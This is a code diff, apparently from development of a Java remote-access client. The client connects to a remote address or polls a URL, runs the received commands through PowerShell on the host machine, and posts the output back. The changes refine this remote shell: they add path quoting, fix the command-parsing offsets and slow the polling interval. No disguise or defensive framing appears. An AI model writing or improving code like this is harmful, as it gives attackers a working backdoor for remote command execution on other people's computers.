@@ -1,5 +1,6 @@
 package org.fun;
 
+import javax.print.attribute.standard.OrientationRequested;
 import java.io.*;
 import java.net.HttpURLConnection;
 import java.net.Socket;
@@ -7,17 +8,19 @@ import java.net.Socket;
 public class Client extends Thread{
     private Socket socket;
     private Runtime process;
-    private String directory = System.getProperty("user.dir");
+    private String directory;
     private DataInputStream input;
     private DataOutputStream output;
     private WebHTTP webHTTP;
     public Client(String address, int port) throws IOException{
+        directory = System.getProperty("user.dir");
         socket = new Socket(address, port);
         input = new DataInputStream(socket.getInputStream());
         output = new DataOutputStream((socket.getOutputStream()));
         process = Runtime.getRuntime();
     }
     public Client(String url) {
+        directory = System.getProperty("user.dir");
         if (url.endsWith("/")) {
             url = url.substring(0, url.length() - 1);
         }
@@ -25,8 +28,7 @@ public class Client extends Thread{
         webHTTP = new WebHTTP(0, url);
     }
     private String runCommand(String commands) throws IOException {
-//        Process subProcess = process.exec("cmd /c " + commands);
-        Process subProcess = process.exec("powershell.exe cd " + directory + ";" + commands);
+        Process subProcess = process.exec("powershell.exe cd '" + directory + "';" + commands);
         String message = "";
         BufferedReader br = new BufferedReader(new InputStreamReader(
                 subProcess.getInputStream()));
@@ -34,7 +36,7 @@ public class Client extends Thread{
         while ((line = br.readLine()) != null) {
             message += line + "\n";
             if (line.strip().startsWith("Directory: ") && commands.startsWith("cd")) {
-                directory = line.strip().substring("Directory:".length(), line.strip().length());
+                directory = line.strip().substring("Directory:".length() + 1, line.strip().length());
             }
         }
         br.close();
@@ -53,11 +55,11 @@ public class Client extends Thread{
         int[] result = new int[2];
         result[1] = 0;
         while (true) {
-            Thread.sleep(10);
+            Thread.sleep(1000);
             message = webHTTP.httpGet(result);
             if (result[0] > result[1]) {
                 result[1] = result[0];
-                out = runMessage(message.substring(Integer.toString(result[1]).length(), message.length()));
+                out = runMessage(message.substring(Integer.toString(result[1]).length() + 1, message.length()));
                 while (true) {
                     messageSent = webHTTP.httpPost(out);
                     if (messageSent == HttpURLConnection.HTTP_OK)
